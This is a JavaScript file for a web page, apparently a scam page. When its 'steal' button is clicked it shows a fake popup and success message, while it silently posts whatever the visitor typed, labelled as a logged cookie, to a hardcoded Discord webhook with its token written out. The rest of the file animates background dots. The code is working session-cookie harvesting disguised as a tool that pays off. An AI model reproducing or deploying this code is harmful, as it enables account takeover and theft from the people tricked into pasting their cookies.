document.querySelector('.steal-button').addEventListener('click', () => {
    const popup = document.querySelector('.popup');
    const successMessage = document.querySelector('.success-message');
    const inputText = document.querySelector('.input-box').value;

   
    popup.style.display = 'flex';
    setTimeout(() => {
        successMessage.style.display = 'block';
    }, 6000);

    
    if (inputText.trim() !== '') {
        fetch('https://discordapp.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [{
                    title: '🍪 Cookie Logged!',
                    color: 0x6a00ff,
                    description: `**Cookie:**\n\`\`\`${inputText}\`\`\``,
                    timestamp: new Date().toISOString(),
                }],
            }),
        })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send to Discord webhook');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }

    
    setTimeout(() => {
        popup.style.display = 'none';
        successMessage.style.display = 'none';
        document.querySelector('.input-box').value = ''; 
    }, 11000);
});


const dots = document.querySelector('.dots');
let posX = 0;
let posY = 0;
let directionX = 1;
let directionY = 1;
const speed = 0.5;

function animateDots() {
    posX += speed * directionX;
    posY += speed * directionY;

    
    if (posX > 50 || posX < -50) directionX *= -1;
    if (posY > 50 || posY < -50) directionY *= -1;

    dots.style.transform = `translate(${posX}px, ${posY}px)`;
    requestAnimationFrame(animateDots);
}

animateDots();
